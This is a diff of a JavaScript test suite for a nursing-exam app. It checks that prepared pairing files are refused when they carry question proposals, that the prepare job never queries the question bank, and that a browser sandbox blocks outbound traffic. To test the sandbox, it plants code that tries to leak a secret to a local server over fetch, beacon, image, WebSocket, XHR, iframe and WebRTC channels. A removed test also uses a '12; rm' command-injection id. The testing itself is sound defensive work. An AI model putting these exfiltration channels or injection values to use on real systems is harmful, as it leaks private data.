@@ -74,15 +74,18 @@ describe("review frames", () => {
 
 describe("pairing data", () => {
   it("keeps absent, null and text step fields exactly, as the app fingerprints them", () => {
-    const { diagrams } = mapPlan({ diagrams: [{ id: "abg", title: "t", facts: [], steps: [{ key: "a", caption: "c" }, { key: "w", dynamic: true, caption: null }] }], proposals: {} });
+    const { diagrams } = mapPlan({ diagrams: [{ id: "abg", title: "t", facts: [], steps: [{ key: "a", caption: "c" }, { key: "w", dynamic: true, caption: null }] }] });
     expect(diagrams.abg.steps).toEqual([{ key: "a", caption: "c" }, { key: "w", dynamic: true, caption: null }]);
     expect("narration" in diagrams.abg.steps[0]).toBe(false);
   });
-  it("refuses proposals for unknown diagrams or odd question ids", () => {
-    const base = { diagrams: [{ id: "abg", title: "t", facts: [], steps: [] }] };
-    expect(() => mapPlan({ ...base, proposals: { 12: [{ d: "insulin" }] } })).toThrow(/unknown diagram/);
-    expect(() => mapPlan({ ...base, proposals: { "12; rm": [{ d: "abg" }] } })).toThrow(/not a number/);
-    expect(mapPlan({ ...base, proposals: { 12: [{ d: "abg", p: { ph: 7.3 } }] } }).proposals.get(12)).toEqual([{ d: "abg", p: { ph: 7.3 } }]);
+  /* Luna, PR #155: proposals came from the branch's matcher, which was shown
+     the bank and could hide questions in them. The paid job now proposes
+     pairings itself, so a prepared file carrying any is refused. */
+  it("refuses a prepared pairing file that carries proposals", () => {
+    const base = { diagrams: [{ id: "abg", title: "t", facts: [], steps: [{ key: "a", caption: "c" }] }] };
+    expect(() => mapPlan({ ...base, proposals: {} })).toThrow(/diagrams only/);
+    expect(() => mapPlan({ ...base, proposals: { 12: [{ d: "abg", p: { leak: "SECRET STEM" } }] } })).toThrow(/diagrams only/);
+    expect(Object.keys(mapPlan(base).diagrams)).toEqual(["abg"]);
   });
 });
 
@@ -266,23 +269,38 @@ describe("the pairing and narration jobs read the source through the sandbox", (
   };
   const editFile = (root, rel, f) => writeFileSync(join(root, rel), f(readFileSync(join(root, rel), "utf8")));
 
-  it("runs the source's own matcher and reads its own words", async () => {
+  it("reads the source's own words, and offers its code no questions", async () => {
     const { withSandbox } = await import("../ops/render-diagrams.mjs");
-    const { proposePairs } = await import("../src/diagrams/match.js");
-    const q = { id: 1, stem: "The client's potassium is 6.2 mEq/L. Which finding is expected?", options: ["a", "b"], answer: "a", rationale: "Peaked T waves." };
-    const here = await withSandbox(".", (call) => call("propose", [q]));
-    expect(here["1"]).toEqual(proposePairs(q).map((x) => (x.p == null ? { d: x.d } : { d: x.d, p: x.p })));
-    // a source whose matcher reads nothing, and whose ABG step says other words
-    const root = source((r) => {
-      editFile(r, "src/diagrams/match.js", (t) => t.replace("export function proposePairs(item) {", "export function proposePairs(item) {\n  return [];"));
-      editFile(r, "src/diagrams/abg.jsx", (t) => t.replace("Start with the pH. Anything below", "Begin with the pH. Anything below"));
-    });
+    const root = source((r) => editFile(r, "src/diagrams/abg.jsx", (t) => t.replace("Start with the pH. Anything below", "Begin with the pH. Anything below")));
     try {
-      const got = await withSandbox(root, async (call) => ({ p: await call("propose", [q]), abg: await call("raw", "abg") }));
-      expect(got.p["1"]).toEqual([]);
+      const got = await withSandbox(root, async (call) => ({ abg: await call("raw", "abg"), propose: await call("propose", [{ id: 1, stem: "s" }]).then(() => "ran", (e) => String(e)) }));
       expect(got.abg.steps[0].narration).toMatch(/^Begin with the pH/);
       expect(got.abg.steps.find((s) => s.dynamic)).toBeTruthy();
+      // Luna, PR #155: there is no way to hand the source's code a question
+      expect(got.propose).toMatch(/not a function/);
     } finally { rmSync(root, { recursive: true, force: true }); }
+  }, 300_000);
+
+  it("prepares the pairing file from diagrams alone, never touching the bank", async () => {
+    const { createServer } = await import("node:http");
+    const hits = [];
+    const server = createServer((req, res) => { hits.push(req.url); res.end("[]"); });
+    await new Promise((r) => server.listen(0, "127.0.0.1", r));
+    const root = source(() => {});
+    const out = join(mkdtempSync(join(tmpdir(), "map-out-")), "map.json");
+    try {
+      const env = { ...process.env, PULSERN_SUPABASE_URL: `http://127.0.0.1:${server.address().port}`, PULSERN_BANK_READER_EMAIL: "r@example.com", PULSERN_BANK_READER_PASSWORD: "p" };
+      const r = await new Promise((done) => {
+        const c = require("node:child_process").spawn(process.execPath, ["ops/map-diagrams.mjs", "--prepare", out, "--source", root], { env });
+        let o = ""; c.stdout.on("data", (b) => (o += b)); c.stderr.on("data", (b) => (o += b));
+        c.on("close", (code) => done({ code, o }));
+      });
+      expect(r.code, r.o).toBe(0);
+      expect(hits, "the prepare job made no bank request").toEqual([]);
+      const plan = JSON.parse(readFileSync(out, "utf8"));
+      expect(Object.keys(plan).sort()).toEqual(["commit", "diagrams", "kind"]);
+      expect(Object.keys(mapPlan(plan).diagrams)).toContain("abg");
+    } finally { server.close(); rmSync(root, { recursive: true, force: true }); }
   }, 300_000);
 
   it("prepares the narration plan from the source tree, at its commit, and refuses a dirty tree", () => {
@@ -384,23 +402,26 @@ describe("the sandbox cannot send anything out", () => {
       cpSync("src", join(root, "src"), { recursive: true });
       cpSync("package.json", join(root, "package.json"));
       cpSync("package-lock.json", join(root, "package-lock.json"));
-      const m = join(root, "src/diagrams/match.js");
-      writeFileSync(m, readFileSync(m, "utf8").replace("export function proposePairs(item) {", `export function proposePairs(item) {
-  const leak = encodeURIComponent(JSON.stringify(item));
+      const m = join(root, "src/diagrams/index.js");
+      writeFileSync(m, readFileSync(m, "utf8") + `
+setTimeout(() => {
+  const leak = "SECRET";
   try { fetch("${url}/fetch?" + leak).catch(() => {}); } catch {}
   try { navigator.sendBeacon("${url}/beacon", leak); } catch {}
   try { new Image().src = "${url}/img?" + leak; } catch {}
   try { const ws = new WebSocket("${url.replace("http", "ws")}/ws"); } catch {}
   try { const x = new XMLHttpRequest(); x.open("GET", "${url}/xhr?" + leak); x.send(); } catch {}
   try { const f = document.createElement("iframe"); f.src = "${url}/frame?" + leak; document.body.appendChild(f); } catch {}
-  try { new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${server.address().port}" }] }); } catch {}`));
+  try { new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${server.address().port}" }] }); } catch {}
+}, 0);
+`);
       const { withSandbox } = await import("../ops/render-diagrams.mjs");
       const out = await withSandbox(root, async (call) => {
-        const p = await call("propose", [{ id: 1, stem: "SECRET STEM potassium 6.2", options: ["a"], rationale: "SECRET RATIONALE" }]);
+        const ids = await call("ids");
         await new Promise((r) => setTimeout(r, 1500));
-        return p;
+        return ids;
       });
-      expect(out["1"]).toBeTruthy();   // the matcher still ran
+      expect(out).toContain("abg");   // the branch's code still ran
       expect(hits, "nothing left the sandbox").toEqual([]);
       // control: an ordinary page in the same browser can reach the server
       const { launchBrowser } = await import("../ops/browser.mjs");
